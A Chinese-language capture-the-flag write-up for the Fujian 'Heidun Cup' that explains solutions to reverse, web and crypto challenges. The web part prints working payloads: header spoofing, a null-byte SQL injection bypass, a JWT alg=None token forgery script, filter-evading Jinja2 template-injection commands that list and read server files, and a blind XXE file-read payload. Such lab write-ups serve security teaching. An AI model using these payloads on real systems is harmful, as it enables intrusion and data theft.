## 前言

大三接棒冲刺,这一战无疑需要取得好的成绩，为后辈树立榜样！不过福建省"黑盾杯"大多都是基础入门题,就算赢了,也不能太得意XD 路还长~任重而道远呐,这里就挑几题自己做过的题目讲下,misc太基础就不多说了,bin也不说了，害，今年依旧是不会写pwn的菜菜

简单介绍下"黑盾杯"赛制,比赛时长6小时,上半场标准的夺旗赛,但没有一血奖励机制,下半场企业渗透,最后理论知识竞赛结尾(等保问题)

## Re

### guess the key

程序提供了加密方式，和一对明文密文

先逆向加密算法,写出破解key的脚本,再猜测另一份密文可能使用的Key即可

**payload**

```python
plain_text = open('msg01','r').read().strip()
cipher_text = open('msg01.enc','r').read().strip()
cipher2_text = open('msg02.enc','r').read().strip()

plain_text = [ord(i) for i in plain_text]
cipher_text = [ord(i) for i in cipher_text]
cipher2_text = [ord(i) for i in cipher2_text]

t = 0
f = 0
key = ''
plain = ''

for i in range(len(plain_text)):
	c = ((cipher_text[i] - (i*i) - plain_text[i]) ^ t) & 0xff
	key += chr(c)
	t = plain_text[i]
key = key[0:31]
print key

//VeryVeryLongKeyYouWillNeverKnowVery

key = [ord(i) for i in key]
for i in range(len(cipher2_text)):
	c = (cipher2_text[i] - (key[i % len(key)] ^ f) - i*i) & 0xff
	plain += chr(c)
	f = c

print plain

//She had been shopping with her Mom in Wal-Mart. She must have been 6 years old, this beautiful brown haired, freckle-faced image of innocence. It was pouring outside. The kind of rain that gushes over the top of rain gutters, so much in a hurry to hit the Earth, it has no time to flow down the spout.flag{101a6ec9f938885df0a44f20458d2eb4}
```

## Web

### i have the_flag

页面js一堆没用的函数，只有一个`ck`函数有用

```javascript
function ck(s) {
    try {
        ic
    } catch (e) {
        return;
    }
    var a = [118, 108, 112, 115, 111, 104, 104, 103, 120, 52, 53, 54];
    if (s.length == a.length) {
        for (i = 0; i < s.length; i++) {
            if (a[i] - s.charCodeAt(i) != 3)
                return ic = false;
        }
        return ic = true;
    }
    return ic = false;
}
```

很显然解出这串Ascii值拿去提交就可以成功getflag

```
I have the Flag
Type in something to get the flag.

Tips: Maybe you have the flag.

Something: 
simpleedu123


Congratulations!!

muWn9NU0H6erBN/w+C7HVg
```

### a little hard

```php
<?php
function GetIP(){
if(!empty($_SERVER["HTTP_CLIENT_IP"]))
	$cip = $_SERVER["HTTP_CLIENT_IP"];
else if(!empty($_SERVER["HTTP_X_FORWARDED_FOR"]))
	$cip = $_SERVER["HTTP_X_FORWARDED_FOR"];
else if(!empty($_SERVER["REMOTE_ADDR"]))
	$cip = $_SERVER["REMOTE_ADDR"];
else
	$cip = "0.0.0.0";
return $cip;
}

$GetIPs = GetIP();
if ($GetIPs=="1.1.1.1"){
echo "Great! Key is *********";
}
else{
echo "�������IP���ڷ����б�֮�ڣ�";
}
?>
```

题目直接给了源码，阅读源码可知可通过伪造XFF头令变量`$GetsIP`值为`1.1.1.1`，构造请求头即可得到flag

```python
GET /hard/ HTTP/1.1
Host: 202.0.0.37
x-forwarded-for: 1.1.1.1
Connection: close
```

### click_1

这题就太简单了

查看源码系列

```html
<div id="esc" style="position:absolute;"><input type="button" onfocus="nokp();" onclick="window.location='?key=700c';" value="click me!"></div><input type="text" readonly style="width:350;" id="hint" value="do you want to join? catch button, if you can!">
```

注意到`?key=700c`，于是构造URL访问http://202.0.0.37/click/?key=700c即可得到flag

### 花式过waf

2018黑盾杯原题，使用工具扫描后发现有`www.zip`，下载源码开始代码审计

`function.php`: eregi 可以使用 %00截断正则

```php
function filtering($str) {
    $check= eregi('select|insert|update|delete|\'|\/\*|\*|\.\.\/|\.\/|union|into|load_file|outfile', $str);
    if($check)
        {
        echo "非法字符!";
        exit();
    }
    .....
}
```

`content.php`: 里面直接拼接给的参数

```php
<?php
include './global.php';
extract($_REQUEST);

$sql = "select * from test.content where id=$message_id";

```

构造请求得到flag。

```
message_id="%00" union select 1,2,flag,4 from flag
```

### 忘记密码了

题目一开始只有一个文本框，要求填入email，随便填一个后有alert提示前往`/forget/step2.php?email=youremail@address.com&check=?????`进行下一步

发现网页源代码中有重要信息：

```html
	<meta name="admin" content="admin@simplexue.com" />
	<meta name="editor" content="Vim" />
```

并且`step2.php`中含有一个提交到`submit.php`的表单，有`emailAddress`字段和`token`字段

看到Vim可以想到Vim编辑器在非正常退出的情况下会留下`.swp`文件，经过逐个测试发现了`submit.php`的源码

```php
forget/.submit.php.swp
```

```php
........这一行是省略的代码........

/*
如果登录邮箱地址不是管理员则 die()
数据库结构

--
-- 表的结构 `user`
--

CREATE TABLE IF NOT EXISTS `user` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `username` varchar(255) NOT NULL,
  `email` varchar(255) NOT NULL,
  `token` int(255) NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=2 ;

--
-- 转存表中的数据 `user`
--

INSERT INTO `user` (`id`, `username`, `email`, `token`) VALUES
(1, '****不可见***', '***不可见***', 0);
*/


........这一行是省略的代码........

if(!empty($token)&&!empty($emailAddress)){
	if(strlen($token)!=10) die('fail');
	if($token!='0') die('fail');
	$sql = "SELECT count(*) as num from `user` where token='$token' AND email='$emailAddress'";
	$r = mysql_query($sql) or die('db error');
	$r = mysql_fetch_assoc($r);
	$r = $r['num'];
	if($r>0){
		echo $flag;
	}else{
		echo "失败了呀";
	}
}
```

按照代码构造`token`，得到flag

```
GET /forget/setp2.php?emailAddress=admin@simplexue.com&token=0000000000
```

### py一波吧-ssti+jwt_1

`JWT alg=None 签名bypass攻击` -> `SSTI`，强行把两道题拼成一道题，没有第一步不能进入SSTI

~~~html
随便输入一个用户名密码，将cookie里面的token提取出来，解base64可得

```
{"alg":"HS256","typ":"JWT"}.{"username":"admin1"}.signature
```
~~~

可以生成一个用户名为admin的`token`

```python
#encoding: utf-8 
#PyJWT
import jwt 
import time 
 
 
 
def create_token(): 
    payload = { 
         "username": "admin" 
    } 
    token = jwt.encode(payload, None, algorithm=None) 
    print token 
 
 
create_token()
```

把token换上去，就可以进入SSTI流程了。

SSTI过滤了：单引号、os、system、[]

Jinja2对与不存在的对象有一个特殊的定义**Undefined**类，`<class 'jinja2.runtime.Undefined'>`

**jinja2/runtime.py**

```python
@implements_to_string
class Undefined(object):
    ...
```

通过构造`title={{vvv.__class__.__init__.__globals__ }}`就可以搞事情了，发现有个`eval`，就是它了。

```python
{'new_context': <function new_context at 0x7fc79bb4faa0>, 'chain': <type 'itertools.chain'>, '_context_function_types': (<type 'function'>, <type 'instancemethod'>), 'resolve_or_missing': <function resolve_or_missing at 0x7fc79bb4fcf8>, 'Namespace': <class 'jinja2.utils.Namespace'>, 'ContextMeta': <class 'jinja2.runtime.ContextMeta'>, 'evalcontextfunction': <function evalcontextfunction at 0x7fc79bd919b0>, 'escape': <built-in function escape>, 'LoopContext': <class 'jinja2.runtime.LoopContext'>, '_first_iteration': <object object at 0x7fc79f5b2190>, 'TemplateNotFound': <class 'jinja2.exceptions.TemplateNotFound'>,···'eval': <built-in function eval>
```

不能用`[]`可以使用`.get()`绕过，被过滤的字符串可以拆分成2个字符串或者使用格式化字符串的方法。

```python
{{vvv.__class__.__init__.__globals__.get("__bui"+"ltins__").get("e"+"val")("__imp"+"ort__(\"o"+"s\").po"+"pen(\"ls\").read()")}}
```

执行命令列目录，发现没有传说中的flag，但是发现了一个以数字+英文组合为文件名的文件，经过确认，就是flag

```python
{{vvv.__class__.__init__.__globals__.get("__bui"+"ltins__").get("e"+"val")("__imp"+"ort__(\"o"+"s\").po"+"pen(\"cat f41321d3b61338c8d239e75d971f34a4\").read()")}}
```

本题源码在`/app/none`路径下，也可通过构造类似命令进行读取。

### hardupload

在今年的Google CTF 中出了一道Blind XXE 题 bnv，可以做参考

不懂xxe建议先了解一波

https://www.cnblogs.com/backlion/p/9302528.html

https://xz.aliyun.com/t/3357

上传php一句话返回错误信息

```html
 For Security, our system do not allow upload xml file from now on.</b></br>Other file like png,jpg,rar,zip...etc is welcome</br>
```

可以上传图片等文件格式,恰好xml可以解析svg

**payload**

```xml
<?xml version="1.0"?>
<!DOCTYPE message [
  <!ELEMENT message ANY>
  <!ENTITY % para1 SYSTEM "file:///hhh_Th1s_y0uR_f14g"> //根据报错回显找到flag路径
<!ENTITY % para '
<!ENTITY &#x25; para2 "<!ENTITY &#x26;#x25; error SYSTEM
&#x27;file:///&#x25;para1;&#x27;>">
&#x25;para2;
'>
%para;
]>
<message>10</message>
```

注意指定MIME类型 Content-Type: text/xml

## crypto

### MaybeBase

`YMFZZTY0D3RMD3RMMTIZ 这一串到底是什么！！！！为什么这么像base32却不是！！！明文的md5值为16478a151bdd41335dcd69b270f6b985`

可以用base64不区分大小写工具直接爆出所有可能的flag

```python
#!/usr/bin/env python
#coding: utf-8
import base64,sys,os,redef,re

def dfs(res,arr,pos):
    res.append(''.join(arr))
    i=pos
    for i in range(i,len(arr)):
        if arr[i]<='Z' and arr[i]>='A':
            arr[i]=arr[i].lower()
            dfs(res,arr,i+1)
            arr[i]=arr[i].upper()

if __name__=="__main__":
    print '+' + '-' * 50 + '+'
    print u'\t  base64大小写转换解密工具'
    print '+' + '-' * 50 + '+'
    if len(sys.argv) != 2:
        print u'用法：' + os.path.basename(sys.argv[0]) + u' base64密文'
        print u'实例：' + os.path.basename(sys.argv[0]) + ' "AGV5IULSB3ZLVSE="'
        sys.exit()
    arr = list(sys.argv[1])
    res = []
    dfs(res, arr, 0)
    res_decode = map(base64.b64decode, res)
    for i in res_decode:
        if re.findall(r'\\x', repr(i)):
            continue
        else:
            print i

/*
base64wtfwtf123
base64wtfwtL123
base64wtLwtf123
base64wtLwtL123
baYe64wtfwtf123
baYe64wtfwtL123
baYe64wtLwtf123
baYe64wtLwtL123
*/
```

得到base64wtfwtf123的md5值为16478a151bdd41335dcd69b270f6b985
flag就是这个了！

